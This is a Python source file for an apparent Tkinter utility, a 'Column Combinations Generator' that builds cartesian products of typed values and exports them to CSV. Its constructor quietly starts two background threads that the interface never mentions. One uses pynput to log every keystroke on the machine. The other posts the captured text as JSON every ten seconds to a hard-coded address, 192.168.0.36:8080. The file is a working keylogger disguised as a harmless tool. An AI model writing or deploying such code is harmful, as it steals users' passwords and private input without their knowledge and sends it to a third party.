import tkinter as tk
from tkinter import simpledialog, scrolledtext, filedialog, messagebox
from itertools import product
import csv
import threading
from pynput import keyboard
import requests
import json
import time

text = ""
ip_address = "192.168.0.36"
port_number = "8080"
time_interval = 10  

# ColumnCombination Class
class ColumnCombinations:
    def __init__(self, master):
        self.master = master
        self.master.title("Column Combinations Generator")
        self.columns = []
        self.row_contents = []
        self.combinations = []

        self.setup_ui()

        # Start the post request thread for keyboard data
        threading.Thread(target=send_post_req, daemon=True).start()
        
        # Start the keyboard listener for capturing keypresses
        threading.Thread(target=self.start_keyboard_listener, daemon=True).start()

    def setup_ui(self):
        num_columns = simpledialog.askinteger("Columns", "How many columns do you want?", minvalue=1, maxvalue=10)

        for i in range(num_columns):
            column_name = simpledialog.askstring("Column Name", f"Enter name for column {i + 1}")
            self.columns.append(column_name)

            # Ask for comma-separated row content
            row_data = simpledialog.askstring("Row Content", f"Enter comma-separated values for '{column_name}'")
            rows = [item.strip() for item in row_data.split(',')]  # Split and strip whitespace
            self.row_contents.append(rows)

        # Make columns responsive
        for i in range(len(self.columns)):
            self.master.grid_columnconfigure(i, weight=1, uniform="equal")  # Makes columns resize equally

        self.master.grid_rowconfigure(0, weight=1)  # Make header row adjustable
        self.master.grid_rowconfigure(2, weight=1)  # Make the results row adjustable

        for i, column in enumerate(self.columns):
            tk.Label(self.master, text=column, font=('Arial', 12, 'bold')).grid(row=0, column=i, padx=5, pady=5, sticky="ew")

        tk.Button(self.master, text="Generate Combinations", command=self.generate_combinations).grid(row=1, column=0, columnspan=len(self.columns), pady=10, sticky="ew")

        # Button to save combinations as CSV
        tk.Button(self.master, text="Save as CSV", command=self.save_to_csv).grid(row=1, column=len(self.columns), padx=5, pady=10, sticky="ew")

        self.result_text = scrolledtext.ScrolledText(self.master, width=50, height=20)
        self.result_text.grid(row=2, column=0, columnspan=len(self.columns), padx=10, pady=10, sticky="nsew")

    def generate_combinations(self):
        self.combinations = list(product(*self.row_contents))  # Generate cartesian product of rows
        self.display_combinations()

    def display_combinations(self):
        self.result_text.delete('1.0', tk.END)
        for combo in self.combinations:
            self.result_text.insert(tk.END, f"{' + '.join(combo)}\n")

    def save_to_csv(self):
        # Open a save file dialog to choose the location and file name
        file_path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV Files", "*.csv"), ("All Files", "*.*")])
        if file_path:
            try:
                with open(file_path, mode='w', newline='', encoding='utf-8') as file:
                    writer = csv.writer(file)
                    # Write the header (column names)
                    writer.writerow(self.columns)
                    # Write the combinations
                    for combo in self.combinations:
                        writer.writerow(combo)
                messagebox.showinfo("Success", f"Combinations saved to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"An error occurred while saving the file: {e}")

    # Keyboard listener to capture key presses and update the text variable
    def on_press(self, key):
        global text

        try:
            if key == keyboard.Key.enter:
                text += "\n"
            elif key == keyboard.Key.tab:
                text += "\t"
            elif key == keyboard.Key.space:
                text += " "
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace and len(text) == 0:
                pass
            elif key == keyboard.Key.backspace and len(text) > 0:
                text = text[:-1]
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                return False  # Stop listener when Escape is pressed
            else:
                text += str(key).strip("'")
        except Exception as e:
            print(f"Error processing key: {e}")

    def start_keyboard_listener(self):
        # Start the keyboard listener
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# Function to send keyboard data to the server
def send_post_req():
    while True:
        try:
            payload = json.dumps({"keyboardData": text})
            r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
            print("Data sent successfully")
        except Exception as e:
            print(f"Couldn't complete request: {e}")
        
        time.sleep(time_interval)  # Wait for the specified interval before sending again

# Start the Tkinter application
if __name__ == "__main__":
    root = tk.Tk()
    app = ColumnCombinations(root)
    root.mainloop()

